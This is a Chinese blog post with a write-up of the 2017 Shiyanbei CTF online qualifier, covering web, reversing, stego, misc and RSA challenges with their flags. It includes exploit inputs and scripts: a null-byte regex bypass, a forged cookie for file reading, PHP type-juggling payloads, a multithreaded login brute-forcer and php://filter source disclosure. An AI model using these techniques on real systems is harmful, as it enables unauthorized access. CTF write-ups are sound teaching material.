---
title: 2017 世安杯线上预赛 WriteUp
date: 2017-10-10 14:41:39
tags:
  - CTF
  - WriteUp
---


emmmmmmmm，关于比赛质量问题，出门左转[知乎](https://www.zhihu.com/question/66360616)，出门右转[ctfrank](https://ctfrank.org/events/39)
昨天竟然接到了决赛通知电话，考虑到各种问题，最后还是弃权了
以下是线上赛wp
<!-- more -->

# WEB
## ctf入门级题目
```
http://ctf1.shiyanbar.com/shian-rao/
```
题目给了源代码`index.phps`
```php
<?php
$flag = '*********';

if (isset ($_GET['password'])) {
    if (ereg ("^[a-zA-Z0-9]+$", $_GET['password']) === FALSE)
        echo '<p class="alert">You password must be alphanumeric</p>';
    else if (strpos ($_GET['password'], '--') !== FALSE)
        die($flag);
    else
        echo '<p class="alert">Invalid password</p>';
}
?>

<section class="login">
        <div class="title">
                <a href="./index.phps">View Source</a>
        </div>

        <form method="POST">
                <input type="text" required name="password" placeholder="Password" /><br/>
                <input type="submit"/>
        </form>
</section>
</body>
</html>
```

利用`%00`可以截断`ereg`，构造`?password=1%00—`  
`flag{Maybe_using_rexpexp_wasnt_a_clever_move}`

## 曲奇
```
http://ctf1.shiyanbar.com/shian-quqi/index.php?line=&file=a2V5LnR4dA==
```
file参数后面是`base64编码`的`key.txt`，line是行数
编写py脚本读取`index.php`源码
```python
#!/usr/bin/env
# -*- coding: utf-8 -*-
# by:xishir
import requests as r

r1=r.session()
url='http://ctf1.shiyanbar.com/shian-quqi/index.php?line={0}&file=aW5kZXgucGhw'
for i in range(50):
	r2=r1.get(url.format(str(i)))
	print r
```
读取到的index.php如下
```php
<?php
error_reporting(0);
$file=base64_decode(isset($_GET['file'])?$_GET['file']:"");
$line=isset($_GET['line'])?intval($_GET['line']):0;

if($file=='') header("location:index.php?line=&file=a2V5LnR4dA==");

$file_list = array(
'0' =>'key.txt',
'1' =>'index.php',
);

if(isset($_COOKIE['key']) && $_COOKIE['key']=='li_lr_480'){
$file_list[2]='thisis_flag.php';
}

if(in_array($file, $file_list)){
$fa = file($file);
echo $fa[$line];
}
?>
```
可以看到当cookie中的`key`值为`li_lr_480`，即可读取`thisis_flag.php`文件
![](/img/2017-sab-web2.png)
`flag{UHGgd3rfH*(3HFhuiEIWF}`

## 类型
```
http://ctf1.shiyanbar.com/shian-leixing/
```
经典弱类型题，构造
```
http://ctf1.shiyanbar.com/shian-leixing/?x1=0&x2={'x21':'2018a','x22':[[1],0]}&x3=XIPU-=3CS
```
其中`XIPU-=3CS`md5加密后的8到16位以0e开头，其他全是数字
下面是跑md5脚本
```python
import hashlib
b='-=[],./;"1234567890abcdefghijklmnoprstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

def find(str1):
    if hashlib.md5(str1).hexdigest()[8:10]=='0e':
        flag=0
        for i in hashlib.md5(str1).hexdigest()[10:24]:
            if i>'9':
                flag=1;
                break
        if flag==0:
            print str1
            input("success")
    if(len(str1)>8):
        return
    else:
        for i in b:
            find(str1+i)
if __name__ == '__main__':
    find('XIPU')
```
`CTF{Php_1s_bstl4_1a}`

## 登录
```
http://ctf1.shiyanbar.com/shian-s/
```
提示密码`5位数字`，跑密码
```python
#!/usr/bin/env
# -*- coding: utf-8 -*-
# by:xishir
import requests as r
import re
import threading


url='http://ctf1.shiyanbar.com/shian-s/index.php'
class MyThread(threading.Thread):
	def __init__(self, arg):
		super(MyThread, self).__init__()
		self.arg = arg
	def run(self):
		for site in self.arg:
			scan(site)

def scan(i):
    print i
    try:
    	r1=r.session()
        r3=r1.get(url)
        ss=re.findall(r'type="text"><br><br>(.*?)<br><br>',r3.text)
        url1=url+'?username=admin&password='+i+'&randcode='+ss[0]
        r2=r1.get(url1)
        r2.encoding = 'utf-8'
        #print r2.text
        if len(r2.text)!=146:
        	print r2.text,url1
    except Exception as e:
            pass

def main():
	thread_num=100
	site = [[] * 1005 for i in range(thread_num)]
	threads = []
	for i in range(100000):
		j = i % thread_num
		s = '%05d' % i
		site[j].append(s)
	for i in site:
		t = MyThread(i)
		threads.append(t)
	for i in threads:
		i.setDaemon(True)
		i.start()
	for i in threads: 
		i.join()

if __name__ == '__main__':
	main()
```
跑出来密码为`00325`
`flag{U1tkOdgutaVWucdy2AbDWXPGkDx9bS2a}`

## admin
```
http://ctf1.shiyanbar.com/shian-du/
```
`php伪协议php://input`通过第一个if  
再利用
```
http://ctf1.shiyanbar.com/shian-du/?user=php://input&file=php://filter/read=convert.base64-encode/resource=index.php
```
读取index.php和class.php源码
提示flag在`f1a9.php`中，f1a9被过滤了，于是构造`反序列化`字符串读取flag，听说大佬们用这个直接读取了其他web题的flag，膜
![](/img/2017-sab-web5.png)
`flag_Xd{hSh_ctf:e@syt0g3t}` 


# 逆向
## Console
PEID查出来是`C#`写的，ILSpy反编译得到源码
![](/img/2017-sab-re1.png)
将代码取出来编译运行，输出string b得到flag
`flag{967DDDFBCD32C1F53527C221D9E40A0B}`

## android
参考：
https://ctf.rip/bsides-sf-ctf-2017-flag-receiver-mobile-reverse-engineering/
`TheseIntentsAreFunAndEasyToUse`

## 简单算法
队友做的

# 隐写
## low
把bmp保存为`png`，Stegsolve.jar打开，扫描二维码
![](/img/2017-sab-ste1.png)
`flag{139711e8e9ed545e}`

## 斑马斑马
用ps处理，提取出`条形码`部分，用qq扫描得到flag
![](/img/2017-sab-ste2.png)
`Tenshine`

## CreateByWho
拼二维码，需要补`三块回型`的块
![](/img/2017-sab-ste3.png)
`Create-By-SimpleLab`

## 适合作为桌面的图片
Stegsolve.jar打开，扫二维码，保存为`pyc`，`反编译`后运行得到flag
![](/img/2017-sab-ste4.png)
`flag{38a57032085441e7}`

# MISC
## reverseMe
winhex打开后在尾部发现`photoshop`字样，不过是倒序的，写个py脚本倒序保存得到图片，再用ps处理得到flag
![](/img/2017-sab-misc1.png)
`flag{4f7548f93c7bef1dc6a0542cf04e796e}`

## 珍妮的qq号
数学题，也可以写个py跑一下就出来了
```python
#!/usr/bin/env
# -*- coding: utf-8 -*-
# by:xishir

for i in range(10000,100000):
	j=i*4
	if j<100000:
		si=str(i)
		sj=str(j)
		if si[0]==sj[4] and si[1]==sj[3] and si[2]==sj[2] and si[3]==sj[1] and si[4]==sj[0]:
			print j
			break
```

## 心仪的公司
wireshark打开，追踪http流找到flag
![](/img/2017-sab-misc3.png)
`fl4g:{ftop_Is_Waiting_4_y}`

# 密码学
## rsa
```python
c= 2044619806634581710230401748541393297937319 
n= 92164540447138944597127069158431585971338721360079328713704210939368383094265948407248342716209676429509660101179587761913570951794712775006017595393099131542462929920832865544705879355440749903797967940767833598657143883346150948256232023103001435628434505839331854097791025034667912357133996133877280328143

import libnum
for e in range(2,10):
    m = libnum.nroot(c,e)
    if m**e==c:
        break

print "e:",e
print "m:",m
flag = libnum.n2s(m)
print flag
```
`so_low`